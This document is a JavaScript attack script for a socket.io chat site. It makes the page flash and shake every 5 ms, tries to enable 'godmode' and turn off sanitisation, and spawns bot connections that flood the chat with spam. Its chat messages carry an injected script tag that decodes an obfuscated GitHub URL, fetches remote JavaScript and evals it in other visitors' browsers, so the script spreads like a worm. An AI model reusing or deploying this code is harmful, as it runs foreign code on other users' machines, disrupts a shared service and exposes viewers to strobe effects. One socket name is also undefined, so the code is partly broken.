setTimeout(() => {
    function randomColor() {
      const r = Math.floor(Math.random() * 256);
      const g = Math.floor(Math.random() * 256);
      const b = Math.floor(Math.random() * 256);
      return `rgb(${r},${g},${b})`;
    }

    function chaos() {
      // Random filter values
      const contrast = 200 + Math.random() * 800;
      const brightness = 150 + Math.random() * 300;
      const hue = Math.floor(Math.random() * 360);
      document.body.style.filter = `contrast(${contrast}%) brightness(${brightness}%) hue-rotate(${hue}deg)`;

      // Random background gradient
      const color1 = randomColor();
      const color2 = randomColor();
      const color3 = randomColor();
      document.body.style.background = `linear-gradient(${Math.random() * 360}deg, ${color1}, ${color2}, ${color3})`;

      // Random text color
      document.body.style.color = randomColor();

      // Shaking effect
      const x = Math.random() * 20 - 10; // -10 to 10 px
      const y = Math.random() * 20 - 10;
      document.body.style.transform = `translate(${x}px, ${y}px) rotate(${Math.random() * 10 - 5}deg)`;
    }

    setInterval(chaos, 5); // Update every 50ms
socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
    });
    socketbb.emit("login", {
        name: "SPREAD THE WORD, 2026 IS COMING",
        room: 50
    });
    socketb.emit("command", {
        list: ["color"]
    });
    socketb.emit('command', { list: ['godmode'] });
    socketb.emit('command', { list: ['pope'] });
    setInterval(() => {
    socketb.emit("talk", {
        text: "SPREAD THE WORD, THE 2026 IS COMING. https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/"
    });
    },500)
}, 500)
setInterval(() => {
socket.emit("talk", {
    text: "SPREAD THE WORD, THE 2026 IS COMING. https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/ <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'RAS2026'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
});
},500)
socket.emit('command',{
  list: ['name', $("#login_name").val() + ' #RAS2026']
})
}, 3000);
